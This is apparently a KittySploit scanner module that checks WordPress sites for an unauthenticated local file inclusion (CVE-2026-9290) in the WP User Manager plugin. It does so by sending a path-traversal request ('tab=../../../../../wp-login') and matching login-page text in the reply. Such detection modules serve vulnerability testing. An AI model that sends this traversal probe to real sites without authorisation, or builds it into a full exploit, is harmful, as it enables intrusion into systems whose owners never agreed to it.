#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WP User Manager – User Profile Builder & Membership plugin for WordPress <= 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP User Manager – User Profile Builder & Membership - Local File Inclusion Detection',
        'description': 'WP User Manager – User Profile Builder & Membership plugin for WordPress <= 2.9.17 contains a local file inclusion caused by improper handling in the profile template scope function, letting unauthenticated attackers execute arbitrary PHP code, exploit requires ability to upload or control PHP files.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'wordpress', 'wp-plugin', 'wp-user-manager', 'lfi', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://patchstack.com/database/vulnerability/wordpress-wp-user-manager-user-profile-builder-membership-plugin-2-9-17-unauthenticated-path-traversal-to-local-file-inclusion-vulnerability',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-9290',
        ],
        'cve': 'CVE-2026-9290',
    }

    def run(self):
        path = '/wp-content/plugins/wp-user-manager/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/profile/admin/about?tab=../../../../../wp-login'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('wp-login-logo', 'Username or Email Address', 'wp-login-lost-password',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='WP User Manager – User Profile Builder & Membership - Local File Inclusion detected', path=path)
            return True
        return False

